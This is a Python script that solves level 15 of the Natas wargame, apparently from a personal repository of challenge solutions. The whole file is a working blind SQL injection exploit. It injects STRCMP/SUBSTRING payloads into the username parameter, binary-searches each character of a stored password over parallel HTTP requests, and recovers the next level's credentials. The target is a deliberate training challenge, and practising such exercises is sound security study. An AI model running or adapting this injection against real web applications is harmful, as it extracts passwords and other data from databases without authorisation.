#!/usr/bin/env python3
import requests
import natas_util as natas

lvl = natas.level(15)

## Solution ##
"""
natas15 is a simple blind content-based SQL injection

Binary search via strcmp:
STRCMP:  1 str is bigger
 		 0 str is the same
 		-1 str is smaller
"""
import string
from multiprocessing import Pool

true = "This user exists."

inject = '" OR {}={} ;-- '
strcmp = 'STRCMP(BINARY {}, BINARY "{}")'
select = 'SELECT password FROM users WHERE username = "{}"'.format(lvl["next_user"])
substring = "SUBSTRING((%s),{},1)" % select

def build_payload(i,c,test=1):
	substring_ = substring.format(i)
	strcmp_ = strcmp.format(substring_,c)
	return inject.format(strcmp_,test)

def smartbrute_char(i):
	alpha = string.digits + string.ascii_uppercase + string.ascii_lowercase
	x = 0
	y = len(alpha)

	while len(alpha) > 2:
		alpha = alpha[x:y]
		j = len(alpha) // 2
		payload = build_payload(i,alpha[j])
		params = {"username":payload, "debug":"1"}
		r = requests.get(lvl["url"],auth=lvl["auth"],params=params)

		if true in r.text:
			x = j+1
			y = len(alpha)
		else:
			x = 0
			y = j+1

	if len(alpha) > 1:
		payload = build_payload(i,alpha[0],0)
		params = {"username":payload, "debug":"1"}
		r = requests.get(lvl["url"],auth=lvl["auth"],params=params)
		if true not in r.text:
			alpha = alpha[1:]
	return alpha[0]

def solve():
	with Pool(32) as p:
		new_password = p.map(smartbrute_char, range(1,33))

	return natas.extract_password("".join(new_password),lvl)

if __name__ == '__main__':
	solve()
